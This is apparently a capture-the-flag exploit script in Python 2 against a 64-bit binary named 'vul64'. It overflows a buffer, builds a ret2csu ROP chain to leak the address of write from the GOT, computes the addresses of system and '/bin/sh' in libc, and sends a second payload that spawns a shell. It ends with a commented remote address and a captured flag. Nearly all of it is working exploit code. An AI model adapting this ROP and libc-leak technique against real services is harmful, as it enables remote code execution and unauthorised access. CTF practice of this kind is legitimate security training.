#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwnxx import *
if len(sys.argv) == 1:
	DEBUG = 1
else :
	DEBUG = 0

if DEBUG:
	# context(log_level='debug')
	# env={'LD_PRELOAD':'libc.so.6'}
	io = process("vul64")
	# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	# io = process("./vul32",env=env)
	gdb.attach(io,'break main')
	# gdb.attach(io,'break *0x400781')

else:
    io = remote(sys.argv[1], int(sys.argv[2]))
    #59.110.240.130:20042

def pwn():
    elf = ELF('vul64')
    libc = ELF('libc.so.6')
    got_write = elf.got['write']
    print "got_write: " + hex(got_write)
    got_read = elf.got['read']
    print "got_read: " + hex(got_read)


    off_system_addr = libc.symbols['write'] - libc.symbols['system']
    print "off_system_addr: " + hex(off_system_addr)



    a=io.recv()
    payload1 =  "A"*51+'\x47'

    payload1 += p64(0x400926) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1)
    payload1 += p64(0x400910)
    payload1 += "B"*56
    payload1 += p64(0x4007c6)


    io.sendline(payload1)


    a=io.recvline()
    print a
    # sleep(1)
    b=io.recv(8)
    print b
    write_addr = u64(b)
    print "write_addr: " + hex(write_addr)
    #
    system_addr = write_addr - off_system_addr
    print "system_addr: " + hex(system_addr)



    #计算/bin/sh的地址
    binsh_addr=write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
    # binsh_addr=write_addr-(0xf7666cd0-0xf76ecdc8)
    print 'binsh_addr= ' + hex(binsh_addr)
    print p64(binsh_addr)




    payload3 = "A"*51+'\x47'
    payload3 += p64(0x400933)+p64(binsh_addr)+p64(system_addr)+p64(0x4007c6)

    io.sendline(payload3)
    sleep(1)
    a=io.recvline()
    print a


    io.interactive()




if __name__ == '__main__':
	pwn()
    #flag{__you_are_so_Cu7e_!!}


